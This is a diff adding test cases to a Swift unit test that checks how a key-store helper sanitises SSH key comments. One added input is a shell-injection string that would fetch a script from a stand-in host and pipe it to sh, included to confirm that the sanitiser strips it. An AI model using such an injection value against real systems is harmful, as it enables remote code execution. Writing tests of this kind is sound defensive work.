@@ -120,6 +120,9 @@ final class KeychainKeyStoreTests {
     @Test func commentHasNoSpaces() {
         #expect(KeychainKeyStore.comment(for: "  work  iPad ") == "tmuxpad-work-iPad")
         #expect(KeychainKeyStore.comment(for: "") == "tmuxpad")
+        #expect(KeychainKeyStore.comment(for: "x';curl${IFS}evil|sh;'") == "tmuxpad-x-curl-IFS-evil-sh")
+        #expect(KeychainKeyStore.comment(for: "id_ed25519.pub") == "tmuxpad-id_ed25519.pub")
+        #expect(KeychainKeyStore.comment(for: "Рабочий iPad") == "tmuxpad-iPad")
     }
 
     @Test(.enabled(if: !SecureEnclave.isAvailable))
